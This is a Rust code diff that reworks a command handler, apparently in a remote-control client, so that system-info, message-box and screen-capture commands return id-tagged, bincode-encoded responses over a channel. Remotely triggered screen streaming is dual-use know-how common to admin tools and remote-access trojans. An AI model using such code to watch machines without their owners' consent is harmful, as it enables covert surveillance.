@@ -1,20 +1,71 @@
-use shared::commands::{Command, Response};
+use shared::commands::{BaseCommand, BaseResponse, CaptureCommand, CaptureType, Command, Response};
+use smol::channel::Sender;
+use std::sync::{Arc, atomic::AtomicBool};
 
-use crate::commands::{capture, computer_info, message_box};
+use crate::{
+    capture,
+    commands::{computer_info, message_box},
+};
 
-pub fn main(command: Command) -> Response {
-    match command {
-        Command::ComputerInfo => match computer_info::main() {
-            Ok(info) => info,
-            Err(err) => Response::Error(err.to_string()),
-        },
-        Command::MessageBox(args) => match message_box::main(args) {
-            Ok(info) => info,
-            Err(err) => Response::Error(err.to_string()),
-        },
-        Command::Screenshot => match capture::screen::main() {
-            Ok(info) => info,
-            Err(err) => Response::Error(err.to_string()),
-        },
-    }
+pub fn send(response: BaseResponse, tx: &Sender<Vec<u8>>) {
+    match tx.try_send(bincode::encode_to_vec(response, bincode::config::standard()).unwrap()) {
+        Ok(_) => {
+            println!("[x] sent frame");
+        }
+        Err(smol::channel::TrySendError::Full(_)) => {
+            println!("[x] congested, dropped response");
+        }
+        Err(smol::channel::TrySendError::Closed(_)) => {
+            println!("[x] channel closed");
+        }
+    };
+}
+
+pub fn main(command: BaseCommand, tx: Sender<Vec<u8>>, capture_running: Option<Arc<AtomicBool>>) {
+    match command.command {
+        Command::ComputerInfo => {
+            send(
+                match computer_info::main() {
+                    Ok(info) => BaseResponse {
+                        id: command.id,
+                        response: info,
+                    },
+                    Err(err) => BaseResponse {
+                        id: command.id,
+                        response: Response::Error(err.to_string()),
+                    },
+                },
+                &tx,
+            );
+        }
+        Command::MessageBox(args) => send(
+            match message_box::main(args) {
+                Ok(info) => BaseResponse {
+                    id: command.id,
+                    response: info,
+                },
+                Err(err) => BaseResponse {
+                    id: command.id,
+                    response: Response::Error(err.to_string()),
+                },
+            },
+            &tx,
+        ),
+        Command::Capture(capture_command, capture_type) => {
+            match capture_command {
+                CaptureCommand::Start => {
+                    ////////////////////////////
+                    match capture_type {
+                        CaptureType::Screen => {
+                            if let Some(running) = capture_running {
+                                capture::screen::main(command.id, tx, running);
+                            }
+                        }
+                        _ => { /* not done!! */ }
+                    }
+                }
+                _ => { /* dafuq */ }
+            }
+        }
+    };
 }
